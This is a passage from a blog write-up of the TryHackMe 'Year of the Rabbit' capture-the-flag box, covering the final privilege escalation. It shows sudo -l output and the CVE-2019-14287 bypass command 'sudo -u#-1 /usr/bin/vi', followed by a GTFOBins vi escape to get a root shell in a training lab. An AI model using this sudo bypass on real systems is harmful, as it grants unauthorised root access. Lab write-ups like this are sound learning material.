-rwsr-xr-- 1 root   dip        326K Apr 14  2015 /usr/sbin/pppd  ---&gt;  Apple_Mac_OSX_10.4.8(05-2007)
-rwsr-xr-x 1 root   root        11K Apr 15  2015 /usr/lib/pt_chown  ---&gt;  GNU_glibc_2.1/2.1.1_-6(08-1999)
</pre></table></code></div></div><p>I’m mostly looking at SUID binaries and ssh keys, but now It doesn’t seem to be the case.</p><p>Running <code class="language-plaintext highlighter-rouge">sudo -l</code> gives me though:</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
</pre><td class="rouge-code"><pre>Matching Defaults entries for gwendoline on year-of-the-rabbit:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gwendoline may run the following commands on
        year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
</pre></table></code></div></div><p>So it looks like I can edit a file user.txt as a sudo without giving a password via executing vi.<br /> But it gets more complicated, because this file cannot be run as root (so we cannot use <code class="language-plaintext highlighter-rouge">sudo</code> too).</p><div class="language-plaintext highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre>sudo /usr/bin/vi /home/gwendoline/user.txt 
[sudo] password for gwendoline: 
Sorry, user gwendoline is not allowed to execute '/usr/bin/vi user.txt' as root on year-of-the-rabbit.
</pre></table></code></div></div><h3 id="cve-2019-14287">CVE-2019-14287</h3><p>There’s a CVE though that relates to setting NOPASSWD rule for everyone except root. Here’s the <a href="https://resources.whitesourcesoftware.com/blog-whitesource/new-vulnerability-in-sudo-cve-2019-14287">link</a></p><p><img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://i.imgur.com/7eKzWlV.png" alt="cve" /> So this is the flag… <code class="language-plaintext highlighter-rouge">-u#-1</code> Let’s modify our previous command to:<br /> <code class="language-plaintext highlighter-rouge">sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt</code> And within the file, proceed with the GTFOBins <img src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-src="https://i.imgur.com/Sjl3clR.png" alt="gtfo-bins" /> I’ll use the second option After that, we get a root shell and we can see the flag in <code class="language-plaintext highlighter-rouge">/root/root.txt</code> Amazing, it was exciting box with so many elements putted into it.</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/blog/categories/tryhackme/'>TryHackMe</a>, <a href='/blog/categories/new-year-series/'>New Year Series</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/blog/tags/ftp/" class="post-tag no-text-decoration" >ftp</a> <a href="/blog/tags/web/" class="post-tag no-text-decoration" >web</a> <a href="/blog/tags/puzzle/" class="post-tag no-text-decoration" >puzzle</a> <a href="/blog/tags/brute-force/" class="post-tag no-text-decoration" >brute-force</a> <a href="/blog/tags/linux/" class="post-tag no-text-decoration" >linux</a> <a href="/blog/tags/easy/" class="post-tag no-text-decoration" >easy</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/">CC BY 4.0</a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=TryHackMe - Year Of The Rabbit - WRITE-UP - Cloufish's Blog&url=https://cloufish.github.io/blog/posts/Year_Of_The_Rabbit/" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=TryHackMe - Year Of The Rabbit - WRITE-UP - Cloufish's Blog&u=https://cloufish.github.io/blog/posts/Year_Of_The_Rabbit/" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://telegram.me/share?text=TryHackMe - Year Of The Rabbit - WRITE-UP - Cloufish's Blog&url=https://cloufish.github.io/blog/posts/Year_Of_The_Rabbit/" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <i class="fa-fw fas fa-link small" onclick="copyLink()" data-toggle="tooltip" data-placement="top" title="Copy link"></i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted topbar-down"><div class="access"><div id="access-lastmod" class="post"> <span>Recent Update</span><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/blog/posts/Can-OWASP-ZAP-replace-Burp-Suite-Professional/">Can OWASP ZAP replace Burp Suite Professional?</a><li><a href="/blog/posts/OWASP-ZAP-as-a-great-fuzzing-tool/">OWASP-ZAP-Fuzzer is it a great alternative for Burp-Suite Intruder?</a><li><a href="/blog/posts/Setting-up-zap-scan-in-cicd-pipeline/">Setting up ZAP Scan in CI/CD pipeline</a><li><a href="/blog/posts/Setting-Up-Hashicorp-Vault-To-Manage-Github-Token/">Setting up Hashicorp Vault to manage our Github Token</a><li><a href="/blog/posts/Preventing-Insufficient-Logging-and-Monitoring/">Concept of Preventing Insufficient Logging & Monitoring</a></ul></div><div id="access-tags"> <span>Trending Tags</span><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/blog/tags/devsecops/">devsecops</a> <a class="post-tag" href="/blog/tags/beginner/">beginner</a> <a class="post-tag" href="/blog/tags/containers/">containers</a> <a class="post-tag" href="/blog/tags/docker/">docker</a> <a class="post-tag" href="/blog/tags/blog/">blog</a> <a class="post-tag" href="/blog/tags/cms/">cms</a> <a class="post-tag" href="/blog/tags/kubernetes/">kubernetes</a> <a class="post-tag" href="/blog/tags/owasp/">owasp</a> <a class="post-tag" href="/blog/tags/pentesting-lab/">pentesting lab</a> <a class="post-tag" href="/blog/tags/zaproxy/">zaproxy</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"> <span class="pl-3 pt-2 mb-2">Contents</span><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div class="col-12 col-lg-11 col-xl-8"><div id="post-extend-wrapper" class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/blog/posts/Pickle_Rick-en/"><div class="card-body"> <span class="timeago small" > Feb 6 <i class="unloaded">2021-02-06T08:46:00+01:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>TryHackMe - Pickle Rick - WRITE-UP</h3><div class="text-muted small"><p> BOX NAME: Pickle Rick NMAP $ nmap -T4 -A -p- -Pn -oG nmap-grepable.txt 10.10.73.110 $ @ Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-24 09:19 UTC Nmap scan report for 10.10.73.110 Host is up ...</p></div></div></a></div><div class="card"> <a href="/blog/posts/basic_pentesting/"><div class="card-body"> <span class="timeago small" > Jan 23 <i class="unloaded">2021-01-23T08:46:00+01:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>TryHackMe - Basic Pentesting WRITE-UP</h3><div class="text-muted small"><p> BOX NAME: Basic Pentesting NMAP $ nmap -T4 -A -p- -Pn -oG nmap-grepable.txt 10.10.31.163 $ @ Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-21 08:36 UTC Nmap scan report for 10.10.31.163 Host i...</p></div></div></a></div><div class="card"> <a href="/blog/posts/Wonderland/"><div class="card-body"> <span class="timeago small" > Feb 18 <i class="unloaded">2021-02-18T08:46:00+01:00</i> </span><h3 class="pt-0 mt-1 mb-3" data-toc-skip>TryHackMe - Wonderland - WRITE-UP</h3><div class="text-muted small"><p> BOX NAME: Wonderland NMAP $ nmap -T4 -A -p- -Pn -oG nmap-grepable.txt 10.10.31.88 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 $ @ Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-26 10:26 UTC Nmap...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/blog/posts/creating-your-own-docker-pentesting-container/" class="btn btn-outline-primary" prompt="Older"><p>blackarch-zsh - How I created blackarch-zsh AND How you can create your own too :)</p></a> <a href="/blog/posts/Wonderland/" class="btn btn-outline-primary" prompt="Newer"><p>TryHackMe - Wonderland - WRITE-UP</p></a></div></div></div></div><footer class="d-flex w-100 justify-content-center"><div class="d-flex justify-content-between align-items-center"><div class="footer-left"><p class="mb-0"> © 2021 <a href="https://twitter.com/cloufisz">Bartholomew Mokrzycki</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><h4 class="text-muted mb-4">Trending Tags</h4><a class="post-tag" href="/blog/tags/devsecops/">devsecops</a> <a class="post-tag" href="/blog/tags/beginner/">beginner</a> <a class="post-tag" href="/blog/tags/containers/">containers</a> <a class="post-tag" href="/blog/tags/docker/">docker</a> <a class="post-tag" href="/blog/tags/blog/">blog</a> <a class="post-tag" href="/blog/tags/cms/">cms</a> <a class="post-tag" href="/blog/tags/kubernetes/">kubernetes</a> <a class="post-tag" href="/blog/tags/owasp/">owasp</a> <a class="post-tag" href="/blog/tags/pentesting-lab/">pentesting lab</a> <a class="post-tag" href="/blog/tags/zaproxy/">zaproxy</a></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a> <script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.7.3/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/blog/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="https://cloufish.github.io{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No result founds.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script>
